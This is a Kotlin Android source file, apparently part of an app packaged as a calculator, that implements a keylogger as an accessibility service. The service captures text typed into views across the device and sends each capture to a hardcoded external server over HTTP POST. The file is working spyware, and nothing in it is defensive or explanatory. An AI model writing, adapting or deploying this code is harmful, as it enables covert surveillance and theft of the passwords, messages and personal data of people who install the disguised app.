package com.agenciacristal.calculadora

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import android.util.Log
import java.net.HttpURLConnection
import java.net.URL
import org.json.JSONObject

class KeyLoggerAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "KeyLogger"
        private const val SERVER_URL = "https://flask-server-xysa.onrender.com/log"
    }

    override fun onServiceConnected() {
        super.onServiceConnected()

        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or AccessibilityEvent.TYPE_VIEW_FOCUSED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            notificationTimeout = 100
        }
        serviceInfo = info
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event != null && event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val text = event.text.joinToString(" ")
            if (text.isNotBlank()) {
                Log.d(TAG, "Texto detectado: $text")
                sendDataToServer(text)
            }
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accesibilidad interrumpida")
    }

    private fun sendDataToServer(data: String) {
        Thread {
            try {
                val url = URL(SERVER_URL)
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.doOutput = true

                val json = JSONObject().apply {
                    put("keystroke", data)
                }

                connection.outputStream.use { outputStream ->
                    outputStream.write(json.toString().toByteArray())
                    outputStream.flush()
                }

                val responseCode = connection.responseCode
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    Log.d(TAG, "Datos enviados correctamente")
                } else {
                    Log.e(TAG, "Error en la respuesta del servidor: $responseCode")
                }
                connection.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "Error al enviar los datos: ${e.message}", e)
            }
        }.start()
    }
}